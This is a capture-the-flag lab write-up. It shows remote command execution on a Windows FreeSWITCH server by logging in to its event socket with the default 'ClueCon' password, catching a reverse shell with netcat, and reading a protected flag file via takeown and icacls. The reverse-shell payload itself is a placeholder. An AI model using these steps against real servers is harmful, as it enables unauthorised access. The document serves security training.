## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
How low are your morals?
What are the flags?
This machine may be slower than normal to boot up and carry out operations.
```
## IP-Address
```IP-Address
10.49.188.166
```
## Enumeration
_Port Scanning_
```bash
PORT     STATE SERVICE          REASON          VERSION
3389/tcp open  ms-wbt-server    syn-ack ttl 126 Microsoft Terminal Services
| ssl-cert: Subject: commonName=WIN-EOM4PK0578N
| Issuer: commonName=WIN-EOM4PK0578N
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-04-19T03:50:44
| Not valid after:  2026-10-19T03:50:44
| MD5:     8134 22ab cb8c d2da bf2e c214 f2e9 5319
| SHA-1:   72dc cce3 0c0b 6156 bb78 65eb ae76 31ec 19f5 ec50
| SHA-256: bf7b a901 c961 d8b9 c35c 75c4 6db1 8237 8c8f 207f 3dce 27b6 89a9 ebc8 3e6f 26d6
| -----BEGIN CERTIFICATE-----
| MIIC4jCCAcqgAwIBAgIQcNFwRGvHsbdLgMukucinqzANBgkqhkiG9w0BAQsFADAa
| MRgwFgYDVQQDEw9XSU4tRU9NNFBLMDU3OE4wHhcNMjYwNDE5MDM1MDQ0WhcNMjYx
| MDE5MDM1MDQ0WjAaMRgwFgYDVQQDEw9XSU4tRU9NNFBLMDU3OE4wggEiMA0GCSqG
| SIb3DQEBAQUAA4IBDwAwggEKAoIBAQC/QNUKQtW3qkEMOrxesswXTTl0F4GsmsHr
| yj0EPjljh9NFx022k2pcCdmQEiXeLLsK7jF5VAMk9C1upGOrX0RlNmLCwR7Kp7aR
| XVciLXdnGXxmMgTtdlks8D+j/Q2G0JReiJQmtA0BXnC/KfuMX1JQT1Fkypldnsox
| hluZqLTz+cEAd0+a/U5Gr26uuqLRnFxNc+UNXBoMFRnIFSm1rrMBMp2YsFL4UHX2
| GkPbjI+/16rWVNi6bAeyPCwr21fARxY8dZEzcjTp/1D7k/Hxp0I1pJ7SaD3qg/2I
| 9Sfn+asYzsTZoLYR0UeNCOL+H5Q+EHWE4LDlbZlv6Inm20WKnLsJAgMBAAGjJDAi
| MBMGA1UdJQQMMAoGCCsGAQUFBwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQsF
| AAOCAQEAb+3jpI7VsAKYldyowpnKh5WzwoXw6oV71WjI3+pMKWcm3n2uOHd2LMZf
| /bC9y/WX4YX8EfVJQ4Ykm7hdJGyZakOKjTZQuUxRWIw1nC0uHB1kMsK9qfH9G+1n
| c7itcXgjPou7BEh87jVisiTjDUXsi1xcYCWpVRk3pgL47tNZG1plUYEfMX+Iov4O
| J8S1K+KWvlxflF9Pnvqlb6aLa3bLlwGdhbWSSjsWuMeuCSwh18Vxp1XGZCMRrBiJ
| 5UK4RHuf6sSzOdThOAZUUi/uv4nqgis1c+7hdWEA8Rx6gB8LjZ/50ahjJFWzcGPG
| iiG8cLDSqj5FU52VGMCnuzakfFv1MA==
|_-----END CERTIFICATE-----
|_ssl-date: 2026-04-20T03:59:25+00:00; -1s from scanner time.
| rdp-ntlm-info:
|   Target_Name: WIN-EOM4PK0578N
|   NetBIOS_Domain_Name: WIN-EOM4PK0578N
|   NetBIOS_Computer_Name: WIN-EOM4PK0578N
|   DNS_Domain_Name: WIN-EOM4PK0578N
|   DNS_Computer_Name: WIN-EOM4PK0578N
|   Product_Version: 10.0.17763
|_  System_Time: 2026-04-20T03:59:20+00:00
8021/tcp open  freeswitch-event syn-ack ttl 126 FreeSWITCH mod_event_socket
```
- Port `8021` is _`FreeSwtich`_ which is actually like a ``CMD``
- And By Default Creds for `FreeSwtich` is `ClueCon`
```bash
$ nc 10.49.188.166 8021
Content-Type: auth/request
auth ClueCon
Content-Type: command/reply
Reply-Text: +OK accepted
api system powershell <powershell Rev-shellCommand>
```
- Got the Rev-shell
```bash
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.157.252] from (UNKNOWN) [10.49.160.233] 49957
dir
Directory: C:\Program Files\FreeSWITCH
Mode                LastWriteTime         Length Name                         
----                -------------         ------ ----                         
d-----       09/11/2021     07:22                cert                         
d-----       09/11/2021     07:22                conf                         
d-----       20/04/2026     04:52                db                           
d-----       09/11/2021     07:18                fonts                   
d-----       09/11/2021     07:18                grammar                  
d-----       09/11/2021     07:18                htdocs               
d-----       09/11/2021     07:18                images            
d-----       09/11/2021     07:18                libmariadb_plugin       
d-----       20/04/2026     04:51                log                       
d-----       09/11/2021     07:18                mod             
d-----       09/11/2021     07:22                recordings         
d-----       09/11/2021     07:22                run                          
d-----       09/11/2021     07:22                scripts                     
d-----       09/11/2021     07:18                sounds                    
d-----       09/11/2021     07:22                storage             
-a----       20/08/2019     13:08        4991488 FreeSwitch.dll              
-a----       20/08/2019     13:08          26624 FreeSwitchConsole.exe        
-a----       20/08/2019     13:19          62976 fs_cli.exe 
-a----       13/05/2019     07:13         293888 ks.dll     
-a----       20/08/2019     13:04         152064 libapr.dll   
-a----       20/08/2019     13:04         134656 libaprutil.dll    
-a----       20/08/2019     13:16         131584 libbroadvoice.dll   
-a----       21/03/2018     20:39        1805824 libeay32.dll        
-a----       23/03/2019     16:37        1050112 libmariadb.dll      
-a----       20/08/2019     13:06         190464 libpng16.dll      
-a----       05/04/2018     10:18         279552 libpq.dll         
-a----       04/04/2018     18:59        1288192 libsndfile-1.dll      
-a----       20/08/2019     13:05        1291776 libspandsp.dll        
-a----       20/08/2019     13:04          27648 libteletone.dll       
-a----       09/08/2018     12:42         283648 lua53.dll           
-a----       09/04/2018     13:36       66362368 opencv_world341.dll   
-a----       09/11/2021     07:18         825160 openh264.dll          
-a----       20/08/2019     13:02           4596 OPENH264_BINARY_LICENSE.txt 
-a----       03/04/2018     18:31         147456 pcre.dll             
-a----       20/08/2019     13:14         313856 pocketsphinx.dll      
-a----       20/08/2019     13:10          49152 pthread.dll           
-a----       13/05/2019     08:03         165888 signalwire_client.dll   
-a----       20/08/2019     13:14         366592 sphinxbase.dll        
-a----       21/03/2018     20:39         349184 ssleay32.dll         
-a----       24/03/2018     20:20       15766528 v8.dll             
-a----       24/03/2018     20:05         177152 v8_libbase.dll     
-a----       24/03/2018     20:19         134656 v8_libplatform.dll    
-a----       03/04/2018     15:01         126976 zlib.dll            
d-----       09/11/2021     07:22                cert             
d-----       09/11/2021     07:22                conf            
d-----       20/04/2026     04:52                db        
d-----       09/11/2021     07:18                fonts     
d-----       09/11/2021     07:18                grammar    
d-----       09/11/2021     07:18                htdocs     
d-----       09/11/2021     07:18                images      
d-----       09/11/2021     07:18                libmariadb_plugin  
d-----       20/04/2026     04:51                log        
d-----       09/11/2021     07:18                mod         
d-----       09/11/2021     07:22                recordings     
d-----       09/11/2021     07:22                run         
d-----       09/11/2021     07:22                scripts       
d-----       09/11/2021     07:18                sounds        
d-----       09/11/2021     07:22                storage
-a----       20/08/2019     13:08        4991488 FreeSwitch.dll
-a----       20/08/2019     13:08          26624 FreeSwitchConsole.exe
-a----       20/08/2019     13:19          62976 fs_cli.exe
-a----       13/05/2019     07:13         293888 ks.dll
-a----       20/08/2019     13:04         152064 libapr.dll
-a----       20/08/2019     13:04         134656 libaprutil.dll
-a----       20/08/2019     13:16         131584 libbroadvoice.dll
-a----       21/03/2018     20:39        1805824 libeay32.dll
-a----       23/03/2019     16:37        1050112 libmariadb.dll
-a----       20/08/2019     13:06         190464 libpng16.dll
-a----       05/04/2018     10:18         279552 libpq.dll
-a----       04/04/2018     18:59        1288192 libsndfile-1.dll
-a----       20/08/2019     13:05        1291776 libspandsp.dll
-a----       20/08/2019     13:04          27648 libteletone.dll
-a----       09/08/2018     12:42         283648 lua53.dll
-a----       09/04/2018     13:36       66362368 opencv_world341.dll
-a----       09/11/2021     07:18         825160 openh264.dll
-a----       20/08/2019     13:02           4596 OPENH264_BINARY_LICENSE.txt  
-a----       03/04/2018     18:31         147456 pcre.dll
-a----       20/08/2019     13:14         313856 pocketsphinx.dll
-a----       20/08/2019     13:10          49152 pthread.dll
-a----       13/05/2019     08:03         165888 signalwire_client.dll
-a----       20/08/2019     13:14         366592 sphinxbase.dll
-a----       21/03/2018     20:39         349184 ssleay32.dll
-a----       24/03/2018     20:20       15766528 v8.dll
-a----       24/03/2018     20:05         177152 v8_libbase.dll
-a----       24/03/2018     20:19         134656 v8_libplatform.dll
-a----       03/04/2018     15:01         126976 zlib.dll
PS C:\Program Files\FreeSWITCH> cd ..
PS C:\Program Files> dir


    Directory: C:\Program Files


Mode                LastWriteTime         Length Name                                      
----                -------------         ------ ----                                      
d-----       09/11/2021     16:46                Amazon
d-----       09/11/2021     07:14                Common Files
d-----       09/11/2021     07:38                FreeSWITCH
d-----       07/09/2019     01:31                internet explorer
d-----       09/11/2021     16:40                VMware
d-r---       07/09/2019     01:31                Windows Defender
d-----       07/09/2019     01:31                Windows Defender Advanced Threat Protection
d-----       15/09/2018     08:19                Windows Mail
d-----       07/09/2019     01:31                Windows Media Player
d-----       15/09/2018     08:19                Windows Multimedia Platform
d-----       15/09/2018     08:28                windows nt
d-----       07/09/2019     01:31                Windows Photo Viewer
d-----       15/09/2018     08:19                Windows Portable Devices
d-----       15/09/2018     08:19                Windows Security
d-----       15/09/2018     08:19                WindowsPowerShell
PS C:\Program Files> cd ..
PS C:\> dir
    Directory: C:\

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       20/04/2026     04:55                badr
d-----       15/09/2018     08:19                PerfLogs
d-r---       09/11/2021     16:41                Program Files
d-----       09/11/2021     07:13                Program Files (x86)
d-----       09/11/2021     07:18                projects
d-r---       09/11/2021     07:28                Users
d-----       09/11/2021     16:47                Windows

PS C:\> cd Users
PS C:\Users> dir
    Directory: C:\Users
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       09/11/2021     07:13                Administrator
d-----       09/11/2021     07:37                Nekrotic
d-r---       09/11/2021     07:13                Public

PS C:\Users> cd Nekrotic
PS C:\Users\Nekrotic> dir

    Directory: C:\Users\Nekrotic

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---       09/11/2021     07:31                3D Objects
d-r---       09/11/2021     07:31                Contacts
d-r---       09/11/2021     07:39                Desktop
d-r---       09/11/2021     07:31                Documents
d-r---       09/11/2021     07:31                Downloads
d-r---       09/11/2021     07:31                Favorites
d-r---       09/11/2021     07:31                Links
d-r---       09/11/2021     07:31                Music
d-r---       09/11/2021     07:31                Pictures
d-r---       09/11/2021     07:31                Saved Games
d-r---       09/11/2021     07:31                Searches
d-r---       09/11/2021     07:31                Videos
PS C:\Users\Nekrotic> cd Desktop
PS C:\Users\Nekrotic\Desktop> dir
    Directory: C:\Users\Nekrotic\Desktop
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       09/11/2021     07:39             38 root.txt
-a----       09/11/2021     07:39             38 user.txt
PS C:\Users\Nekrotic\Desktop> cat user.txt
[flag omitted]
```
## Privilege Escalation
```powershell
PS C:\> whoami
win-eom4pk0578n\nekrotic
PS C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Disabled
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Disabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
SeTimeZonePrivilege                       Change the time zone                                               Disabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled
PS C:\> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                                    Type             SID          Attributes
============================================================= ================ ============ ===============================================================
Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                                        Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\BATCH                                            Well-known group S-1-5-3      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                                                 Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                                Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account                                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                                         Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level                          Label            S-1-16-12288
```
#### Ways of Exploitation
- `SeImpersonatePrivilege` → **Enabled**
- `SeDebugPrivilege` → **Enabled**
- You are in:
    - `BUILTIN\Administrators` ✅
    - High integrity session ✅'

```bash
PS C:\>
PS C:\Users\Nekrotic\Desktop> type root.txt
PS C:\Users\Nekrotic\Desktop> icacls root.txt
Successfully processed 0 files; Failed processing 1 files
PS C:\Users\Nekrotic\Desktop> takeown /f root.txt
SUCCESS: The file (or folder): "C:\Users\Nekrotic\Desktop\root.txt" now owned by user "WIN-EOM4PK0578N\Nekrotic".
PS C:\Users\Nekrotic\Desktop> cat root.txt
PS C:\Users\Nekrotic\Desktop> type root.txt
PS C:\Users\Nekrotic\Desktop> icacls root.txt /grant Administrators:F
processed file: root.txt
Successfully processed 1 files; Failed processing 0 files
PS C:\Users\Nekrotic\Desktop> type root.txt
[flag omitted]
PS C:\Users\Nekrotic\Desktop>
```
- Got the Root Flag
```Flag
[flag omitted]
```
- Flags
```Flag
User - [flag omitted]
Root - [flag omitted]
```

# END